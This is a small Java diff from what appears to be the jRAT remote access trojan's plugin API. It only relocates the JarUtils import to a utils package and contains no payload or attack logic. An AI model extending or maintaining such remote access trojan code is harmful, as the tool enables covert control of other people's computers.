@@ -10,7 +10,6 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.jar.JarFile;
 
-import pro.jrat.api.JarUtils;
 import pro.jrat.api.PluginClassLoader;
 import pro.jrat.api.RATControlMenuEntry;
 import pro.jrat.api.RATMenuItem;
@@ -20,6 +19,7 @@ import pro.jrat.api.events.OnDisconnectEvent;
 import pro.jrat.api.events.OnEnableEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
+import pro.jrat.api.utils.JarUtils;
 
 import com.redpois0n.Main;
 import com.redpois0n.common.Version;
